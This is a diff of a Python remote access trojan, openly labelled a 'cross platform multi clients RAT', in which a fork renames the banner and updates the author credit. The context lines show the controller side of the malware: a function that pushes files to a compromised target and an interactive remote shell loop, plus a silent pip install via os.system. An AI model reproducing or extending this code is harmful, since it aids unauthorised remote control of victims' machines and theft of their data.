@@ -17,16 +17,17 @@ elif platform.system().startswith("Linux"):
         os.system("python3 -m pip install pystyle -q -q -q")
         from pystyle import *
 banner = Center.XCenter(r"""
-***********************************************************************
-*     ________   _______ _   _ ____        ____      _  _______        *
-*    / /  _ \ \ / /  ___| | | |  _ \      |  _ \    / \|_   _\ \       *
-*   | || |_) \ V /| |_  | | | | | | |_____| |_) |  / _ \ | |  | |      *
-*  < < |  __/ | | |  _| | |_| | |_| |_____|  _ <  / ___ \| |   > >     *
-*   | ||_|    |_| |_|    \___/|____/      |_| \_\/_/   \_\_|  | |      *
-*    \_\                                                     /_/       *
-*                       CROSS PLATFORM MULTI CLIENTS RAT               *
-*              Coded By: Machine1337, Forked by Neos Helios            *
-************************************************************************                        
+*************************************************************************************************
+*     :::    ::: :::::::::: :::        ::::::::::: ::::::::  :::::::::      ::: :::::::::::     *
+*     :+:    :+: :+:        :+:            :+:    :+:    :+: :+:    :+:   :+: :+:   :+:         *
+*     +:+    +:+ +:+        +:+            +:+    +:+    +:+ +:+    +:+  +:+   +:+  +:+         *
+*     +#++:++#++ +#++:++#   +#+            +#+    +#+    +:+ +#++:++#:  +#++:++#++: +#+         *
+*     +#+    +#+ +#+        +#+            +#+    +#+    +#+ +#+    +#+ +#+     +#+ +#+         *
+*     #+#    #+# #+#        #+#            #+#    #+#    #+# #+#    #+# #+#     #+# #+#         *
+*     ###    ### ########## ########## ########### ########  ###    ### ###     ### ###         *
+*                                   CROSS PLATFORM MULTI CLIENTS RAT                            *
+*                             Coded By: Machine1337, Forked by Neos Helios                      *
+*************************************************************************************************
 """)
 os.system("cls||clear")
 print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
@@ -60,7 +61,7 @@ def download_file(target, file_name):
 def upload_file(target, file_name):
     f = open(file_name, 'rb')
     target.send(f.read())
-#coded By Machine1337....If u like the tool...Follow me on github: @machine1337
+#coded By Machine1337, forked by Neos Helios....If u like the tool...Follow me on github: @machine1337, @ARCH66H
 def shell(target, ip):
     while True:
         command = input(Colors.yellow+"\n[*] Shell@%s " % str(ip))
